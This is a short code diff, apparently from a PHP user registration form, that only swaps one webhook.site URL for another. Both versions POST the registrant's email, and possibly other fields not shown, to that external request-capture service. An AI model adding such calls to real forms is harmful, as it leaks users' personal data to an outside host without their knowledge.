@@ -203,7 +203,7 @@ class UserRegisterForm extends FormBase
       $form_state->set('user_data', $data);
 
       try {
-        $this->httpClient->request('POST', 'https://webhook.site/e3c32ac8-eb7d-4d77-94ba-a6b1878fb311', [
+        $this->httpClient->request('POST', 'https://webhook.site/943d7c73-2faa-45eb-a8e0-3d09dda94560', [
           'headers' => ['Content-Type' => 'application/json'],
           'json' => [
             'email' => $data['mail'],
